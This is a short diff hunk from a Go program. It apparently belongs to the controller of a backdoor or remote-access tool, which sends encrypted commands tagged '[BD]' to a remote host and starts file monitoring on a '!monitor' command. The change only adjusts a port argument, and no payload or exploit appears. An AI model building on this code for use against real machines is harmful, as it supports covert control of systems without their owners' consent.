@@ -59,7 +59,7 @@ func intiateClient(ip string, port, lport uint16){
 			sendEncryptedData(port, "[BD]" + input, ip, CMD);
 			if strings.HasPrefix(input, "!monitor") {
 				args := strings.Split(input, " ");
-				go fileWait(ip, args[1], lport + 1)
+				go fileWait(ip, args[1], lport)
 			}
 		} else if input == "?help" {
 			fmt.Print(helpStr);
